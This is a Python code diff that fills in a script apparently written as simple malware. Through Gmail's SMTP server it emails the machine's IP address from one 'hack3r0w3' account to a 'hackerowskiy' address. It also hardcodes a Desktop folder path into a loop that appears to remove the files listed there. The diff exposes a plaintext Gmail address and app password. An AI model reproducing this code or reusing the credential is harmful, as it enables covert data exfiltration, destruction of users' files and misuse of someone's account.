@@ -19,17 +19,17 @@ def get_ip():
 def send_email_ip():
     smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
     smtp_server.starttls()
-    smtp_server.login("email", "app_password")
+    smtp_server.login("hack3r0w3@gmail.com", "auyxqxgjhifwzjrv")
     #Create message
     msg= MIMEMultipart()
-    msg["From"] = "from_email"
-    msg["To"] = "to_email"
+    msg["From"] = "hack3r0w3@gmail.com"
+    msg["To"] = "hackerowskiy@gmail.com"
     #Text message
     msg["Subject"] = "IP ADDRESS"
     text = f"{get_ip()}"
     msg.attach(MIMEText(text, "plain"))
     #Send 
-    smtp_server.sendmail("from_email", "to_email", msg.as_string())
+    smtp_server.sendmail("hack3r0w3@gmail.com", "hackerowskiy@gmail.com", msg.as_string())
     smtp_server.close()
     print("Sended!")
 
@@ -85,8 +85,8 @@ while True:
                 files = os.listdir(directory) 
                 listToString = str(files)
                 sendList = "Removed: ",listToString 
-                USER_NAME = getpass.getuser()
-                dir = f'/Users/{USER_NAME}/Desktop/'
+
+                dir = '/Users/sairex/Desktop/'
                 for files in os.listdir(dir):
                     path = os.path.join(dir, files)
                     try:
